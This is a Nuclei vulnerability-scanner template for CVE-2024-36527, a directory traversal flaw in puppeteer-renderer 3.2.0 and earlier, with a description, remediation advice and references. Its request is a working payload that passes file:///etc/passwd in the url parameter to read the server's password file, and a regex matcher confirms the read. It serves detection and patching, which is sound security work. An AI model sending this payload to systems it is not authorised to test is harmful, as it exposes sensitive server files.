id: CVE-2024-36527

info:
  name: Puppeteer Renderer  - Directory Traversal
  author: Stux
  severity: medium
  description: |
    puppeteer-renderer v.3.2.0 and before is vulnerable to Directory Traversal. Attackers can exploit the URL parameter using the file protocol to read sensitive information from the server.
  impact: |
    An attacker can exploit this vulnerability to read arbitrary files on the server, potentially gaining access to sensitive information.
  remediation: |
    Users should update to version 3.3.0 or later where this issue has been addressed. Additionally, ensure that input validation is implemented to restrict the url parameter to only http and https protocols.
  reference:
    - https://github.com/zenato/puppeteer-renderer/issues/97
    - https://gist.github.com/7a6163/25fef08f75eed219c8ca21e332d6e911
  metadata:
    max-request: 1
    verified: true
  tags: cve,cve2024,puppeteer-renderer

http:
  - method: GET
    path:
      - "{{BaseURL}}/html?url=file:///etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100fbf05ce5cc696fd2dbeeaa531c1904cbb53e58ec59f73254cb82485aed38c67602210082c754bee05444a1eb6c4ac0e29dee416611be09b98d13bde368e71a66a1f3c4:922c64590222798bb761d5b6d8e72950